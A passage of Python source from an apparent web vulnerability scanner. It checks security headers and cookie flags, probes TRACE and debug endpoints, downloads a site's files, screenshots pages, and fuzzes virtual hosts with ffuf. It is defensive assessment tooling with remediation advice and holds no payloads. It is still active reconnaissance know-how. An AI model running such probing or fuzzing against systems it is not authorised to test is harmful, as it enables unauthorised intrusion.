                owasp="A05:2025 Security Misconfiguration", nist="SC-8",
                remediation=_platform_remed(
                    "Set Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
                    server_hdr, powered_by,
                ),
                command=_hdr_cmd,
                http_code=resp.status_code,
            )

    _xfo_val = headers.get("X-Frame-Options", "")
    if _xfo_val and _xfo_val.upper().strip() not in ("DENY", "SAMEORIGIN"):
        out.add_finding(
            title="Permissive Security Header: X-Frame-Options",
            url=url, port=target["port"], risk="LOW",
            description=(
                f"X-Frame-Options is set to a permissive or non-standard value: '{_xfo_val}'. "
                "Only DENY or SAMEORIGIN provide effective clickjacking protection."
            ),
            output=f"X-Frame-Options: {_xfo_val}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="SI-10",
            remediation=_platform_remed(
                "Set X-Frame-Options: DENY (or SAMEORIGIN if same-origin embedding is required).",
                server_hdr, powered_by,
            ),
            command=_hdr_cmd,
            http_code=resp.status_code,
        )

    _xcto_val = headers.get("X-Content-Type-Options", "")
    if _xcto_val and _xcto_val.strip().lower() != "nosniff":
        out.add_finding(
            title="Permissive Security Header: X-Content-Type-Options",
            url=url, port=target["port"], risk="LOW",
            description=(
                f"X-Content-Type-Options is present but not set to 'nosniff': '{_xcto_val}'. "
                "MIME-sniffing protection is not active."
            ),
            output=f"X-Content-Type-Options: {_xcto_val}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="SI-10",
            remediation=_platform_remed(
                "Set X-Content-Type-Options: nosniff",
                server_hdr, powered_by,
            ),
            command=_hdr_cmd,
            http_code=resp.status_code,
        )

    _rp_val = headers.get("Referrer-Policy", "")
    if _rp_val and _rp_val.strip().lower() in ("unsafe-url", "no-referrer-when-downgrade", ""):
        out.add_finding(
            title="Permissive Security Header: Referrer-Policy",
            url=url, port=target["port"], risk="LOW",
            description=(
                f"Referrer-Policy is set to '{_rp_val}', which sends the full URL as referrer "
                "to third-party destinations and may leak sensitive path or query parameters."
            ),
            output=f"Referrer-Policy: {_rp_val}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="SI-12",
            remediation=_platform_remed(
                "Set Referrer-Policy: strict-origin-when-cross-origin (or no-referrer for highest privacy).",
                server_hdr, powered_by,
            ),
            command=_hdr_cmd,
            http_code=resp.status_code,
        )

    _cc_val = headers.get("Cache-Control", "")
    if _cc_val and "public" in _cc_val.lower() and "no-store" not in _cc_val.lower():
        out.add_finding(
            title="Permissive Security Header: Cache-Control",
            url=url, port=target["port"], risk="LOW",
            description=(
                f"Cache-Control is set to '{_cc_val}' which permits public caching without "
                "'no-store'. Sensitive responses may be cached by intermediary proxies or CDNs."
            ),
            output=f"Cache-Control: {_cc_val}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="SI-12",
            remediation=_platform_remed(
                "Add 'Cache-Control: no-store, no-cache' to sensitive endpoint responses.",
                server_hdr, powered_by,
            ),
            command=_hdr_cmd,
            http_code=resp.status_code,
        )

    vc.status(phase, "Security Headers", "running", "CORS check", 2, 5)
    acao = headers.get("Access-Control-Allow-Origin", "")
    acac = headers.get("Access-Control-Allow-Credentials", "")
    if acao == "*" and acac.lower() == "true":
        out.add_finding(
            title="CORS Misconfiguration Allowing Credential Leakage",
            url=url, port=target["port"], risk="HIGH",
            description="The CORS policy reflects arbitrary origins or uses a wildcard origin combined with credentials-allowed, permitting malicious third-party sites to make credentialed cross-origin requests and read responses.",
            output=f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
            sources="fracture-headers", service=target["scheme"],
            owasp="A05:2025 Security Misconfiguration", nist="AC-4",
            remediation="Maintain an explicit allowlist of trusted origins; never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true; and reject unexpected Origin headers.",
            http_code=resp.status_code,
        )

    vc.status(phase, "Security Headers", "running", "Cookie flags", 3, 5)
    # Parse raw Set-Cookie headers
    raw_sc = headers.get("Set-Cookie", "")
    sc_list = [raw_sc] if raw_sc else []
    # Try to get multiple Set-Cookie via requests internals
    try:
        all_sc = resp.raw.headers.getlist("Set-Cookie")
        if all_sc:
            sc_list = all_sc
    except Exception:
        pass

    for sc in sc_list:
        if not sc:
            continue
        sc_lower = sc.lower()
        cname    = sc.split("=")[0].strip() if "=" in sc else sc.split(";")[0].strip()
        if cname:
            _hdr_cookie_names.append(cname)
        _sc_out  = f"Set-Cookie: {sc[:300]}"
        _sc_src  = "fracture-headers"
        _sc_owasp = "A05:2025 Security Misconfiguration"
        _sc_nist  = "SC-23"

        # HttpOnly
        if "httponly" not in sc_lower:
            out.add_finding(
                title="Missing Secure Cookie Attribute: HttpOnly",
                url=url, port=target["port"], risk="LOW",
                description=(
                    f"Cookie '{cname}' does not have the HttpOnly attribute. "
                    "Without HttpOnly, the cookie is accessible to JavaScript, "
                    "exposing it to XSS-based theft."
                ),
                output=_sc_out, sources=_sc_src, service=target["scheme"],
                owasp=_sc_owasp, nist=_sc_nist,
                output_file=_sh_ev,
                remediation="Add the HttpOnly attribute to all session and authentication cookies.",
                http_code=resp.status_code,
            )

        # Secure
        if is_https and "secure" not in sc_lower:
            out.add_finding(
                title="Missing Secure Cookie Attribute: Secure",
                url=url, port=target["port"], risk="LOW",
                description=(
                    f"Cookie '{cname}' does not have the Secure attribute on an HTTPS site. "
                    "Without Secure, the cookie can be transmitted over unencrypted HTTP connections."
                ),
                output=_sc_out, sources=_sc_src, service=target["scheme"],
                owasp=_sc_owasp, nist=_sc_nist,
                output_file=_sh_ev,
                remediation="Add the Secure attribute to all cookies on HTTPS sites.",
                http_code=resp.status_code,
            )

        # SameSite — missing or misconfigured
        _ss_m = re.search(r'samesite\s*=\s*([^\s;,]+)', sc_lower)
        if not _ss_m:
            out.add_finding(
                title="Missing Secure Cookie Attribute: SameSite",
                url=url, port=target["port"], risk="LOW",
                description=(
                    f"Cookie '{cname}' does not have the SameSite attribute. "
                    "Without SameSite, the cookie is sent with all cross-site requests, "
                    "increasing CSRF risk."
                ),
                output=_sc_out, sources=_sc_src, service=target["scheme"],
                owasp=_sc_owasp, nist=_sc_nist,
                output_file=_sh_ev,
                remediation="Add SameSite=Lax or SameSite=Strict to all cookies.",
                http_code=resp.status_code,
            )
        else:
            _ss_val = _ss_m.group(1).strip()
            if _ss_val not in ("strict", "lax", "none"):
                out.add_finding(
                    title="Misconfigured Secure Cookie Attribute: SameSite",
                    url=url, port=target["port"], risk="LOW",
                    description=(
                        f"Cookie '{cname}' has SameSite set to an unrecognised value "
                        f"'{_ss_val}'. Browsers will treat it as SameSite=None (no restriction)."
                    ),
                    output=_sc_out, sources=_sc_src, service=target["scheme"],
                    owasp=_sc_owasp, nist=_sc_nist,
                    output_file=_sh_ev,
                    remediation="Set SameSite to Strict, Lax, or None (with Secure).",
                    http_code=resp.status_code,
                )
            elif _ss_val == "none":
                if "secure" not in sc_lower:
                    out.add_finding(
                        title="Misconfigured Secure Cookie Attribute: SameSite",
                        url=url, port=target["port"], risk="LOW",
                        description=(
                            f"Cookie '{cname}' has SameSite=None without the Secure attribute. "
                            "Browsers reject SameSite=None cookies that lack Secure, and the "
                            "cookie will be blocked or transmitted insecurely."
                        ),
                        output=_sc_out, sources=_sc_src, service=target["scheme"],
                        owasp=_sc_owasp, nist=_sc_nist,
                        output_file=_sh_ev,
                        remediation="Add the Secure attribute when using SameSite=None.",
                        http_code=resp.status_code,
                    )

    # Expect-CT — deprecated in Chrome 113+ but worth flagging if misconfigured
    vc.status(phase, "Security Headers", "running", "Expect-CT check", 4, 5)
    expect_ct = headers.get("Expect-CT", "")
    if expect_ct and "enforce" in expect_ct.lower() and "max-age=0" in expect_ct:
        out.add_finding(
            title="Misconfigured Expect-CT Header (max-age=0 with enforce)",
            url=url, port=target["port"], risk="LOW",
            description=(
                "The Expect-CT header is present with 'enforce' and 'max-age=0'. "
                "This combination causes the browser to enforce CT but immediately "
                "expire the policy, which is a misconfiguration."
            ),
            output=f"Expect-CT: {expect_ct}",
            sources="fracture-headers", service=target["scheme"],
            output_file=str(out_f),
            owasp="A05:2025 Security Misconfiguration", nist="SC-8",
            remediation=(
                "Remove Expect-CT (deprecated in Chrome 113+) or set max-age to "
                "a positive value. Modern Certificate Transparency is enforced by browsers natively."
            ),
            http_code=resp.status_code,
        )


    # ── TRACE method detection (XST) ─────────────────────────────────────────
    try:
        _tr = sess.request("TRACE", url, timeout=timeout, allow_redirects=False)
        if _tr.status_code < 500 and (
            "TRACE" in (_tr.text or "").upper()[:500]
            or _tr.status_code in (200, 204)
        ):
            out.add_finding(
                title="HTTP TRACE Method Enabled (Cross-Site Tracing)",
                url=url, port=target["port"], risk="LOW",
                description=(
                    "The HTTP TRACE method is enabled. TRACE echoes back the request "
                    "body, which can be leveraged in Cross-Site Tracing (XST) attacks "
                    "to steal cookie or auth header values via client-side script "
                    "when combined with other XSS vectors."
                ),
                output=f"TRACE {url} → HTTP {_tr.status_code}",
                sources="fracture-headers", service=target["scheme"],
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                remediation="Disable the TRACE HTTP method on all web servers. In Apache: TraceEnable off. In Nginx: if ($request_method = TRACE) { return 405; }",
            )
            vc.log("[headers] TRACE method enabled", "WARNING")
    except Exception:
        pass

    # ── Debug mode detection ──────────────────────────────────────────────────
    _debug_body_re = re.compile(
        r'DEBUG\s*=\s*True|app\.debug\s*=\s*True|"debug"\s*:\s*true|'
        r'werkzeug\.debug|Werkzeug Debugger|Interactive Console|'
        r'Traceback \(most recent call last\)|DebugView|'
        r'__traceback__|jinja2\.exceptions',
        re.I,
    )
    for _dbpath in ("/debug", "/_debug", "/api/debug", "/console", "/_ah/admin",
                    "/flask-debug", "/debug-toolbar", "/error"):
        try:
            _dbr = sess.get(url.rstrip("/") + _dbpath, timeout=timeout, allow_redirects=False)
            if _dbr is not None and _dbr.status_code == 200 and _debug_body_re.search(_dbr.text[:4000]):
                out.add_finding(
                    title="Debug Mode Enabled / Developer Console Exposed",
                    url=url.rstrip("/") + _dbpath, port=target["port"], risk="HIGH",
                    description=(
                        f"A debug or developer console endpoint is accessible at "
                        f"{_dbpath} and its response contains debug mode indicators. "
                        "Exposed debug interfaces can allow remote code execution "
                        "(e.g. Werkzeug interactive debugger) and leak internal stack traces."
                    ),
                    output=f"GET {_dbpath} → HTTP {_dbr.status_code}\n{_dbr.text[:500]}",
                    sources="fracture-headers", service=target["scheme"],
                    owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                    remediation="Set DEBUG=False in production. Remove or restrict all debug/console endpoints.",
                )
                vc.log(f"[headers] Debug mode exposed at {_dbpath}", "WARNING")
                break
        except Exception:
            pass

    try:
        _write_target_profile(out, cookies=_hdr_cookie_names)
    except Exception:
        pass
    vc.status(phase, "Security Headers", "complete", "Done", 5, 5)
    vc.log("[headers] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 2b: shcheck
# ─────────────────────────────────────────────

def _phase_shcheck(target: dict, cfg: dict, pm: ProgressManager,
                   out: OutputManager, sess: requests.Session,
                   extra_urls: "list | None" = None,
                   wc_baseline: "dict | None" = None) -> None:
    """Run shcheck against the target URL (and any extra URLs) to detect missing
    HTTP security response headers.

    Findings:
      - "Missing Security Header: <name>" — MEDIUM for HSTS, LOW for all others
    Output saved to: headers/shcheck_<hostname>_<port>.txt
    SSL error retry: if shcheck bails on TLS validation, retried with -d flag.

    Extra URLs are validated with a quick GET probe before shcheck is invoked.
    Any URL that is a wildcard false positive, returns 404/410, or is unreachable
    is discarded immediately — no subprocess is spawned and no file is written.
    """
    phase   = "shcheck"
    timeout = cfg.get("timeout", 10) + 20   # shcheck needs a little more time

    shcheck = _find_shcheck()
    if not shcheck:
        vc.log("[shcheck] shcheck not found — skipping", "WARNING")
        return

    _HSTS = "Strict-Transport-Security"
    _val_timeout = min(cfg.get("timeout", 10), 6)
    targets_to_scan = [target]
    if extra_urls:
        for eu in extra_urls:
            try:
                targets_to_scan.append(_parse_target(eu))
            except Exception:
                pass

    vc.status(phase, "shcheck", "running", "Security header check", 0, len(targets_to_scan))

    for i, tgt in enumerate(targets_to_scan):
        tgt_url  = tgt["url"]
        hostname = tgt["hostname"]
        port     = tgt["port"]
        safe_host = hostname.replace(".", "_")
        out_f    = out.output_path("headers", f"shcheck_{safe_host}_{port}")

        # Extra URLs (i > 0) are validated before shcheck runs.  False positives
        # are deleted immediately — no output file is written, no subprocess spawned.
        if i > 0:
            try:
                _val_r = sess.get(tgt_url, timeout=_val_timeout, allow_redirects=True)
                if _val_r.status_code in (404, 410):
                    vc.log(
                        f"[shcheck] Skipping {tgt_url} — HTTP {_val_r.status_code} (not found)",
                        "INFO",
                    )
                    continue
                if wc_baseline is not None and _is_wildcard_match(_val_r, wc_baseline):
                    vc.log(
                        f"[shcheck] Skipping {tgt_url} — wildcard false positive",
                        "INFO",
                    )
                    continue
            except Exception:
                vc.log(f"[shcheck] Skipping {tgt_url} — unreachable", "INFO")
                continue

        # Build command: python3 path/to/shcheck.py if it's a .py script
        _flags = ["-k", "--colors=none", "-j"]
        if shcheck.endswith(".py"):
            cmd = [sys.executable, shcheck] + _flags + [tgt_url]
        else:
            cmd = [shcheck] + _flags + [tgt_url]

        vc.log(f"[shcheck] Running on {tgt_url}", "INFO")
        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=timeout, errors="replace",
            )
            combined = proc.stdout + (proc.stderr or "")
            out.log_command("shcheck", cmd, out_f)

            # Retry with -d if SSL validation error produced no results
            _ssl_err = "SSL: Certificate validation error." in combined
            _no_data = "set()" in combined or not any(
                kw in combined for kw in ("missing", "Missing", "[!]", '"missing"')
            )
            if _ssl_err and _no_data:
                vc.log(f"[shcheck] SSL error — retrying with -d on {hostname}:{port}", "WARNING")
                cmd_d = list(cmd)
                cmd_d.insert(-1, "-d")
                try:
                    proc_d   = subprocess.run(
                        cmd_d, capture_output=True, text=True,
                        timeout=timeout, errors="replace",
                    )
                    combined = proc_d.stdout + (proc_d.stderr or "")
                    proc     = proc_d
                    out.log_command("shcheck", cmd_d, out_f)
                except (subprocess.TimeoutExpired, OSError):
                    pass

            out_f.write_text(combined, encoding="utf-8", errors="replace")

        except subprocess.TimeoutExpired:
            vc.log(f"[shcheck] Timed out on {hostname}:{port}", "WARNING")
            # Do not store a timeout placeholder — delete the file immediately
            # so no useless artifact is left in the headers/ directory.
            try:
                if out_f.exists():
                    out_f.unlink()
            except Exception:
                pass
            vc.status(phase, "shcheck", "running", "Scanning", i + 1, len(targets_to_scan))
            continue
        except OSError as exc:
            vc.log(f"[shcheck] Launch error on {hostname}:{port}: {exc}", "ERROR")
            vc.status(phase, "shcheck", "running", "Scanning", i + 1, len(targets_to_scan))
            continue

        # ── Parse JSON output ─────────────────────────────────────────────
        stdout_text = proc.stdout or ""
        _json_parsed = False
        try:
            shcheck_json = json.loads(stdout_text)
            if isinstance(shcheck_json, dict):
                # shcheck -j has two output formats depending on version:
                #   newer: {"missing": [...], "present": [...]}  (flat, root-level)
                #   older: {"http://url/": {"missing": [...], "present": [...]}}
                _inner = shcheck_json
                if "missing" not in shcheck_json:
                    # URL-keyed format — take the first value that is a dict
                    for _v in shcheck_json.values():
                        if isinstance(_v, dict) and "missing" in _v:
                            _inner = _v
                            break
                missing_headers = _inner.get("missing") or []
                if not isinstance(missing_headers, list):
                    missing_headers = []
                for hdr in missing_headers:
                    hdr = str(hdr).strip()
                    if not hdr:
                        continue
                    if hdr not in _SHCHECK_ALLOWED_HEADERS:
                        continue   # filter to the canonical 6 security headers only
                    if hdr == _HSTS and not tgt["is_https"]:
                        continue   # HSTS only applies to HTTPS
                    risk = _SEC_HDR_RISK.get(hdr, "LOW")
                    out.add_finding(
                        title=f"Missing Security Header: {hdr}",
                        url=tgt_url, port=port, risk=risk,
                        description=f"The HTTP security header '{hdr}' is absent.",
                        output=f"Missing: {hdr}",
                        sources="shcheck", service=tgt["scheme"],
                        output_file=str(out_f),
                        affected=_url_rel_path(tgt_url, target["url"]),
                        owasp="A05:2025 Security Misconfiguration", nist="SC-8",
                        remediation=f"Add the '{hdr}' header to all HTTP responses.",
                    )
                    vc.log(f"[shcheck] Missing: {hdr} ({risk}) on {hostname}:{port}", "SUCCESS")
                _json_parsed = True
        except (json.JSONDecodeError, Exception):
            pass

        # ── Text-format fallback ──────────────────────────────────────────
        if not _json_parsed:
            for line in stdout_text.splitlines():
                line = line.strip()
                m = re.match(r'^\[!\]\s+Missing\s+security\s+header:\s+(\S+)', line)
                if not m:
                    m = re.match(
                        r'^\[!\]\s+(?:The\s+)?[Hh]eader\s+[\'"]?([A-Za-z0-9_-]+)[\'"]?\s+is\s+missing',
                        line,
                    )
                if not m:
                    continue
                hdr = m.group(1).strip()
                if hdr not in _SHCHECK_ALLOWED_HEADERS:
                    continue   # filter to the canonical 6 security headers only
                if hdr == _HSTS and not tgt["is_https"]:
                    continue
                risk = "HIGH" if hdr == _HSTS else ("MEDIUM" if hdr == "Content-Security-Policy" else "LOW")
                out.add_finding(
                    title=f"Missing Security Header: {hdr}",
                    url=tgt_url, port=port, risk=risk,
                    description=f"The HTTP security header '{hdr}' is absent.",
                    output=line,
                    sources="shcheck", service=tgt["scheme"],
                    output_file=str(out_f),
                    affected=_url_rel_path(tgt_url, target["url"]),
                    owasp="A05:2025 Security Misconfiguration", nist="SC-8",
                    remediation=f"Add the '{hdr}' header to all HTTP responses.",
                )
                vc.log(f"[shcheck] Missing: {hdr} ({risk}) on {hostname}:{port}", "SUCCESS")

        vc.status(phase, "shcheck", "running", "Scanning", i + 1, len(targets_to_scan))

    vc.status(phase, "shcheck", "complete", "Done", len(targets_to_scan), len(targets_to_scan))
    vc.log("[shcheck] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 0b: Screenshot
# ─────────────────────────────────────────────

def _phase_screenshot(target: dict, cfg: dict, pm: ProgressManager,
                      out: OutputManager) -> None:
    """Capture a screenshot of the target URL using headless Chrome via Selenium.

    Saved to: recon/screenshot_<hostname>_<port>.png
    Creates an INFO finding "Web Screenshot Captured" with output_file pointing
    to the PNG so it can be viewed via Crucible's Evidence tab.
    """
    phase    = "screenshot"
    url      = target["url"]
    hostname = target["hostname"]
    port     = target["port"]

    if not _check_selenium():
        vc.log("[screenshot] selenium not available — skipping", "WARNING")
        return

    vc.status(phase, "Screenshot", "running", "Launching browser", 0, 1)

    save_dir  = out.root / "recon"
    save_dir.mkdir(parents=True, exist_ok=True)
    safe_host = hostname.replace(".", "_")
    out_path  = save_dir / f"screenshot_{safe_host}_{port}.png"

    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options

        opts = Options()
        opts.add_argument("--headless=new")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--ignore-certificate-errors")
        opts.add_argument("--allow-insecure-localhost")
        opts.add_argument("--window-size=1280,800")
        opts.add_experimental_option("excludeSwitches", ["enable-logging"])
        chrome_bin = _find_chrome_binary()
        if chrome_bin:
            opts.binary_location = chrome_bin
        # Resolve IP for --host-resolver-rules (enables SNI virtual host rendering)
        _ip = target.get("ip")
        if not _ip:
            try:
                _ip = socket.gethostbyname(hostname)
            except Exception:
                _ip = None
        if hostname and _ip and _ip != hostname:
            opts.add_argument(f"--host-resolver-rules=MAP {hostname} {_ip}")

        svc    = _build_chrome_service()
        driver = webdriver.Chrome(service=svc, options=opts)
        try:
            driver.set_page_load_timeout(15)
            try:
                driver.get(url)
            except Exception:
                pass
            total_h = driver.execute_script(
                "return Math.max("
                "  document.body.scrollHeight,"
                "  document.documentElement.scrollHeight"
                ")"
            )
            driver.set_window_size(1280, max(800, int(total_h)))
            driver.save_screenshot(str(out_path))
        finally:
            try:
                driver.quit()
            except Exception:
                pass

        _ss_rel = urllib.parse.urlparse(url).path or "/"
        out.add_finding(
            title=f"Web Screenshot Captured: {_ss_rel}",
            url=url, port=port, risk="INFO",
            description=f"A screenshot of {url} was captured during reconnaissance.",
            output=f"Saved: {out_path.name}",
            sources="fracture-screenshot", service=target["scheme"],
            output_file=str(out_path),
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation="Review screenshot for exposed sensitive content.",
        )
        vc.log(f"[screenshot] Saved: {out_path}", "SUCCESS")

    except Exception as exc:
        vc.log(f"[screenshot] Failed: {type(exc).__name__}: {exc}", "WARNING")

    vc.status(phase, "Screenshot", "complete", "Done", 1, 1)
    vc.log("[screenshot] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 0c: Web file download
# ─────────────────────────────────────────────

def _web_path_to_filename(path: str) -> str:
    """Convert a URL path to a safe flat filename, preserving file extension."""
    path = path.split("?")[0].strip("/")
    name = path.replace("/", "__") or "index"
    if "." not in name.rsplit("/", 1)[-1]:
        name += ".html"
    return _RE_UNSAFE_FNAME.sub("_", name)[:200]


def _phase_webfiles(target: dict, cfg: dict, pm: ProgressManager,
                    out: OutputManager, sess: requests.Session) -> None:
    """Download well-known web files and linked HTML/PHP files from the target.

    Strategy:
    1. Fetch each path in _WEB_WELL_KNOWN.
    2. Parse the index page for href/src links with recognised extensions.
    3. Download up to _MAX_WEB_LINKS additional same-host files.
    Deduplication via SHA-256 body hash prevents saving identical 404 pages.

    Files saved to: recon/web/<hostname>_<port>/
    Creates an INFO finding listing all downloaded files.
    """
    phase    = "webfiles"
    url      = target["url"]
    hostname = target["hostname"]
    port     = target["port"]
    timeout  = cfg.get("timeout", 10)

    save_dir = out.root / "recon" / "web" / f"{hostname}_{port}"
    save_dir.mkdir(parents=True, exist_ok=True)

    base_url     = url.rstrip("/")
    visited:     set   = set()
    seen_hashes: set   = set()
    to_fetch:    list  = list(_WEB_WELL_KNOWN)
    saved:       list  = []

    vc.status(phase, "Web Files", "running", "Downloading", 0, len(_WEB_WELL_KNOWN))

    def _get_and_save(path: str) -> "str | None":
        if path in visited:
            return None
        visited.add(path)
        furl = base_url + path if path.startswith("/") else path
        try:
            r    = sess.get(furl, timeout=timeout, stream=True, allow_redirects=True)
            body = b""
            for chunk in r.iter_content(8192):
                body += chunk
                if len(body) >= _MAX_FILE_BYTES:
                    break
            digest = hashlib.sha256(body).hexdigest()
            if digest in seen_hashes:
                return None
            seen_hashes.add(digest)
            text  = body.decode("utf-8", errors="replace")
            fname = _web_path_to_filename(path)
            fpath = save_dir / fname
            fpath.write_text(text, encoding="utf-8")
            return str(fpath)
        except Exception:
            return None

    for path in _WEB_WELL_KNOWN:
        fpath = _get_and_save(path)
        if fpath:
            saved.append((path, fpath))
            if path in ("/", "/index.html", "/index.php"):
                try:
                    text = Path(fpath).read_text(encoding="utf-8", errors="replace")
                    for m in re.finditer(
                        r'(?:href|src)=["\']([^"\'>\s]+)["\']', text, re.IGNORECASE
                    ):
                        href = m.group(1)
                        if not any(href.lower().endswith(ext) for ext in _WEB_EXTS):
                            continue
                        if href.startswith("http"):
                            if f"{hostname}" in href or f"{hostname}:{port}" in href:
                                after = re.sub(r"^https?://[^/]+", "", href)
                                to_fetch.append(after or "/")
                        else:
                            to_fetch.append(href if href.startswith("/") else "/" + href)
                except Exception:
                    pass

    for path in to_fetch:
        if path in _WEB_WELL_KNOWN:
            continue
        if len(saved) >= _MAX_WEB_LINKS:
            break
        fpath = _get_and_save(path)
        if fpath:
            saved.append((path, fpath))

    vc.status(phase, "Web Files", "running", f"{len(saved)} files", len(saved), max(len(saved), 1))

    for _wf_path, _wf_fpath in saved:
        out.add_finding(
            title=f"Web Files Downloaded: {_wf_path}",
            url=url, port=port, risk="INFO",
            description=f"File downloaded from {base_url}{_wf_path} during reconnaissance.",
            output=Path(_wf_fpath).name,
            sources="fracture-webfiles", service=target["scheme"],
            output_file=_wf_fpath,
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation="Review downloaded files for sensitive information or misconfigurations.",
        )
    if saved:
        vc.log(f"[webfiles] {len(saved)} files saved to {save_dir}", "SUCCESS")

    vc.status(phase, "Web Files", "complete", "Done", len(saved), max(len(saved), 1))
    vc.log("[webfiles] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 2c: ffuf — virtual host & parameter fuzzing
# ─────────────────────────────────────────────

def _phase_ffuf(target: dict, cfg: dict, pm: ProgressManager,
                out: OutputManager, sess: requests.Session) -> None:
    """Run ffuf for virtual host discovery and URL parameter brute-forcing.

    Virtual host discovery:
      - Fuzzes Host header using a DNS subdomain wordlist.
      - Filters responses whose content-length matches the baseline (same server
        answering every request) to suppress false positives.
      - Findings: "Virtual Host Discovered: <vhost>.<host>" (LOW)

    Parameter discovery:
      - Fuzzes GET parameters on the target URL to discover hidden params that
        elicit a different response (size or status change vs baseline).
      - Findings: "Hidden Parameter Discovered: <param>" (LOW)

    Output saved to ffuf/ subdirectory.
    """
    phase  = "ffuf"
    url    = target["url"]
    host   = target["hostname"]
    port   = target["port"]
    timeout = cfg.get("timeout", 10)

    ffuf = _find_tool("ffuf")
    if not ffuf:
        vc.log("[ffuf] ffuf not found — skipping", "WARNING")
        return

    vhost_wl = _find_wordlist(
        "Discovery/DNS/namelist.txt",
        cfg.get("ffuf_vhost_wordlist", ""),
    )
    param_wl = _find_wordlist(
        "Discovery/Web-Content/burp-parameter-names.txt",
        cfg.get("ffuf_param_wordlist", ""),
    )

    ffuf_dir = out.root / "ffuf"
    ffuf_dir.mkdir(exist_ok=True)

    # ── 1. Virtual host discovery ─────────────────────────────────────────────
    vc.status(phase, "ffuf", "running", "vhost discovery", 0, 2)
    if Path(vhost_wl).exists():
        # Take 3 baseline samples with obviously bogus hostnames to detect
        # wildcard-DNS environments where every subdomain gets a valid response.
        # Collect all unique sizes, word counts, and line counts so that ffuf's
        # -fs/-fw/-fl filters catch every variant of the wildcard response.
        _VHOST_MAX_FINDINGS = 20     # sanity cap: more than this almost certainly = wildcard
        _VHOST_BURST_THRESHOLD = 50  # if ffuf returns ≥ this many hits, treat as wildcard FP
        _bl_sizes:   list = []
        _bl_words:   list = []
        _bl_lines:   list = []
        _bl_bogons = [
            f"_fracture_nxdomain_a_.{host}",
            f"_fracture_nxdomain_b_.{host}",
            f"_fracture_nxdomain_c_.{host}",
        ]
        for _bghost in _bl_bogons:
            try:
                _bl_r = sess.get(url, timeout=timeout, headers={"Host": _bghost})
                _bl_body = _bl_r.content
                _bl_sizes.append(len(_bl_body))
                _bl_words.append(len(_bl_body.split()))
                _bl_lines.append(_bl_body.count(b"\n"))
            except Exception:
                pass

        _fs_arg = ",".join(str(s) for s in sorted(set(_bl_sizes))) if _bl_sizes else "0"
        _fw_arg = ",".join(str(w) for w in sorted(set(_bl_words))) if _bl_words else ""
        _fl_arg = ",".join(str(l) for l in sorted(set(_bl_lines))) if _bl_lines else ""

        vhost_out = ffuf_dir / f"vhost_{host}_{port}.json"
        cmd = [
            ffuf, "-w", vhost_wl,
            "-u", url,
            "-H", f"Host: FUZZ.{host}",
            "-mc", "200,201,204,301,302,307,401,403",
            "-fs", _fs_arg,
            "-s",
            "-json", "-o", str(vhost_out),
            "-t", "40",
            "-timeout", str(timeout),
        ]
        if _fw_arg:
            cmd += ["-fw", _fw_arg]
        if _fl_arg:
            cmd += ["-fl", _fl_arg]

        vc.log(
            f"[ffuf] vhost discovery on {host} "
            f"(baseline sizes={_fs_arg} words={_fw_arg or 'n/a'} lines={_fl_arg or 'n/a'})",
            "INFO",
        )
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            proc.communicate(timeout=180)
            _deregister_proc(proc)
            out.log_command("ffuf", cmd, vhost_out)
            if vhost_out.exists():
                try:
                    ffuf_data = json.loads(vhost_out.read_text(encoding="utf-8"))
                    results = ffuf_data.get("results", [])

                    # Sanity check: large hit counts indicate wildcard DNS — discard all
                    if len(results) >= _VHOST_BURST_THRESHOLD:
                        vc.log(
                            f"[ffuf] {len(results)} vhost hits suppressed — likely wildcard DNS "
                            f"(≥{_VHOST_BURST_THRESHOLD} results; all filtered as false positives)",
                            "WARNING",
                        )
                        results = []

                    _vhost_count = 0
                    for result in results:
                        if _vhost_count >= _VHOST_MAX_FINDINGS:
                            vc.log(
                                f"[ffuf] vhost findings capped at {_VHOST_MAX_FINDINGS} "
                                f"— remaining hits suppressed",
                                "WARNING",
                            )
                            break
                        vhost_word = result.get("input", {}).get("FUZZ", "").strip()
                        status     = result.get("status", 0)
                        resp_len   = result.get("length", 0)
                        if not vhost_word:
                            continue
                        full_vhost = f"{vhost_word}.{host}"
                        out.add_finding(
                            title=f"Virtual Host Discovered: {full_vhost}",
                            url=url, port=port, risk="LOW",
                            description=(
                                f"ffuf discovered virtual host '{full_vhost}' (HTTP {status}, "
                                f"{resp_len} bytes). The host header was fuzzed against {url}."
                            ),
                            output=f"Host: {full_vhost}\nStatus: {status}\nLength: {resp_len}",
                            sources="ffuf", service=target["scheme"],
                            output_file=str(vhost_out),
                            affected=full_vhost,
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation=(
                                "Review virtual host configuration. Ensure unintended vhosts "
                                "are not accessible or are properly access-controlled."
                            ),
                        )
                        vc.log(f"[ffuf] vhost: {full_vhost} → {status}", "SUCCESS")
                        _vhost_count += 1
                except Exception:
                    pass
        except Exception as e:
            out.log_error("ffuf-vhost", cmd, str(e))
    else:
        vc.log(f"[ffuf] vhost wordlist not found: {vhost_wl} — skipping vhost fuzz", "WARNING")

    # ── 2. Parameter discovery ────────────────────────────────────────────────
    vc.status(phase, "ffuf", "running", "param discovery", 1, 2)
